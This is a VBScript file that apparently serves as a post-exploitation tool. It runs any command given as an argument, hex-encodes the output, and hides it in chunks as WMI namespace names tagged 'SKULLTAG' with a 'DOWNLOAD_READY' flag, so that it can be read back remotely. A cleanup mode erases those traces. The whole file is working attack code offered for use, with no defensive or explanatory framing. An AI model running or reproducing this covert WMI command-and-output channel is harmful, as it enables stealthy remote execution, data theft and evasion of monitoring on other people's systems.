function hexEn(str)
	dim strEncoded, i
	strEncoded = ""
	for i = 1 to Len(str)
		strEncoded = strEncoded + "_" + Hex(Asc(Mid(str, i, 1)))
	next
	hexEn = strEncoded
end function
function hexDe(str)
	dim strDecoded, i, hexValue
	strDecoded = ""
	for i = 2 to Len(str)
		hexValue = ""
		while Mid(str, i, 1) <> "_" and i <= Len(str)
			hexValue = hexValue + Mid(str, i, 1)
			i = i+1
		wend
		strDecoded = strDecoded + chr(CLng("&h" & hexValue))
	next
	hexDe = strDecoded
end function
function prepare(byVal strIn)
    If Len(strIn) = 0 Then
        prepare = 0 : Exit function
    Else
        prepare = Asc(strIn)
    End If
End function
function parseCmdOutput(cmdOutput)
	strLen = Len(cmdOutput)
	pieceLen = 5500
	nbOfPieces = Int(strLen/pieceLen)
	For i = 1 to nbOfPieces
		piece = Left(cmdOutput,pieceLen)
		piece = "        " + piece + "        "
		cmdOutput = Mid(cmdOutput,pieceLen+1)
		insertPiece i,piece
	Next
	cmdOutput = "        " + cmdOutput + "        "
	insertPiece nbOfPieces+1,cmdOutput		
End function
function insertPiece(ByVal number,ByVal piece)
	count = CStr(number)
	zeros = String(6 - Len(count), "0")
	tag = "SKULLTAG" + zeros + count
	piece = hexEn(piece)
	piece = tag + piece	
	WScript.Echo piece
	Set aShell = CreateObject("WScript.Shell")
	aShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='" + piece + "'")
        WScript.Sleep 50
End function
Set myShell = CreateObject("WScript.Shell")
cmd = myShell.ExpandEnvironmentStrings("%comspec%")
tmpDir = myShell.ExpandEnvironmentStrings("%TEMP%")
Select Case WScript.Arguments.Item(0)
    Case "cleanup"
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'DOWNLOAD_READY'"" delete")
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%SKULLTAG%'"" delete")
    Case Else
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'DOWNLOAD_READY'"" delete")
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%SKULLTAG%'"" delete")
	set cmdExecution = myShell.exec(cmd + " /c " + WScript.Arguments.Item(0)) 
	cmdOutput = cmdExecution.StdOut.ReadAll 
	parseCmdOutput cmdOutput 
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='DOWNLOAD_READY'")
End Select
